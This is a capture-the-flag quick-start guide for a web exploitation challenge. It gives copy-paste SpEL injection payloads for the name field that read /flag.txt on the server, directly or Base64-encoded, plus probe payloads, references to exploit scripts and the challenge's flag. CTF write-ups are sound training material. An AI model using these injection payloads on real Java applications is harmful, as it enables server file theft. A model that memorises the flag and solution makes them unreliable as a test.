# Quick Start Guide

## Challenge: Mariooo (M4)
**Category:** Web Exploitation | **Points:** 350 | **Difficulty:** Medium

## TL;DR
SpEL injection in name field → Read `/flag.txt` using Java NIO

---

## Fastest Solution

### Payload (Copy-Paste Ready)
```
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}
```

### Steps
1. Enter payload in the "name" field
2. Submit the form
3. Flag appears in response: `PCC{m4ri0_i5_cr4zy_hmmm_nEcSO5wQsf2y}`

---

## Automated Exploitation

### Using Python Script
```bash
python exploit.py http://challenge-url/
```

### Manual Step-by-Step
```bash
python exploit_manual.py http://challenge-url/
```

---

## Verification Steps

1. **Test basic math**: `${{7*7}}` → Should return `49`
2. **Test Java access**: `${T(java.lang.Math).sqrt(81)}` → Should return `9`
3. **Read flag**: Use payload above

---

## Files in This Directory

- `README.md` - Complete writeup with technical details
- `exploit.py` - Automated exploitation script
- `exploit_manual.py` - Step-by-step manual exploitation
- `payloads.txt` - Collection of all tested payloads
- `QUICKSTART.md` - This file

---

## Alternative Method (Base64)

If direct string method fails:

```
${T(java.util.Base64).getEncoder().encodeToString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}
```

Then decode locally:
```bash
echo "BASE64_OUTPUT" | base64 -d
```

---

## Flag
```
PCC{m4ri0_i5_cr4zy_hmmm_nEcSO5wQsf2y}
```

---

For detailed technical explanation, see `README.md`
